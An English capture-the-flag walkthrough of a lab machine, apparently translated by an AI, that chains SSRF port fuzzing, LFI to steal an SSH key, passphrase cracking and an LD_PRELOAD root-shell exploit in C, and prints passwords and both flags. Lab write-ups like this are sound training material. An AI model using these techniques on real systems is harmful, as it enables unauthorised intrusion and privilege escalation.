Te lo dejo **igual que el anterior**:

* Traducción al **inglés**
* **Misma estructura**
* **Sin resumir**
* **Solo títulos con técnicas importantes**
* **Todas las imágenes usando `<img>` con el mismo estilo**
* Solo mejoré **redacción y ortografía**

---

# Nmap Enumeration

We begin with the port scanning phase using the `nmap` tool:

```bash
nmap -p- --open -n -Pn -T4 --min-rate 8000 -sVC -sS <HOST> -oN <name> -vvv
```

We can see that the open ports are `22/ssh` and `80/http`:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Now we use the `whatweb` tool to gather more information:

```bash
whatweb <HOST>
```

The scan returns an error because the target uses a domain.
When running `whatweb` with the domain, we do not find anything particularly relevant:

```
http://creative.thm [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@example.com,info@website.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.134.13], JQuery[3.4.1], Meta-Author[Devcrud], PasswordField, Script, Title[Creative Studio | Free Bootstrap 4.3.x template], YouTube, nginx[1.18.0]
```

While inspecting the HTTP service, we find a web page:

<img src="/budahacksecurity/uploads/md_images/creativo/creativo.png" style="max-width:100%; border-radius:8px;">

---

# Directory Enumeration (FFUF)

We use the `ffuf` tool to search for hidden directories:

```bash
ffuf -u http://creative.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200
```

We only find the hidden directory `assets`, but it does not contain anything relevant.
Next, we proceed with **subdomain enumeration**:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://creative.thm -H "HOST:FUZZ.creative.thm" -fw 6
```

We discover the subdomain `beta`.
We add it to `/etc/hosts` and review its content.

We observe a page at `beta.creative.thm`, which suggests a possible **SSRF (Server-Side Request Forgery)** vulnerability.

<img src="/budahacksecurity/uploads/md_images/creativo/creativo2.png" style="max-width:100%; border-radius:8px;">

When accessing `http://127.0.0.1`, we are redirected to the main "Creativo" page.
We will perform a brute-force attack to identify possible internal ports using `ffuf`.

First, we generate a list of ports:

```bash
seq 65535 > puertos.txt
```

Then we run the attack:

```bash
ffuf -w puertos.txt -u http://beta.creative.thm -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3
```

Result:

```
80
1337
```

On port `1337`, we find a hidden server that contains an **LFI (Local File Inclusion)** vulnerability.

<img src="/budahacksecurity/uploads/md_images/creativo/creativo3.png" style="max-width:100%; border-radius:8px;">

---

# LFI Exploitation

By exploiting the LFI vulnerability, we discover a user named `saad` and gain access to their `id_rsa` file.

<img src="/budahacksecurity/uploads/md_images/creativo/creativo5.png" style="max-width:100%; border-radius:8px;">

The `id_rsa` file is protected with a password.
We use `ssh2john` to generate a hash and `john the ripper` to crack it:

```bash
ssh2john id_rsa > passwd.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
```

We obtain the password: `sweetness`.

With this password, we can access the server as `saad` via SSH.

---

# Initial Access

After connecting as `saad`, we obtain the first flag:

```
9a1ce90a7653d74ab98630b47b8b4a84
```

---

# Privilege Escalation (LD_PRELOAD)

While reviewing `.bash_history`, we find the password for `saad`:

```
saad:MyStrongestPasswordYet$4291
```

We run the command `sudo -l` and discover that we can escalate privileges using **LD_PRELOAD**.

We follow these steps.

First, we move to `/tmp` and create a C file with the following code:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Next, we compile the file:

```bash
gcc -fPIC -shared -o name.so name.c -nostartfiles
```

We verify that it was created correctly:

```bash
ls -la name.so
```

Finally, we execute the exploit using `ping`:

```bash
sudo LD_PRELOAD=/tmp/name.so ping
```

---

# Root Access

With elevated privileges, we obtain the final flag:

```
992bfd94b90da48634aed182aae7b99f
```

---

# Conclusion

We successfully completed the machine by performing **enumeration, exploitation, and privilege escalation**, ultimately obtaining both flags.


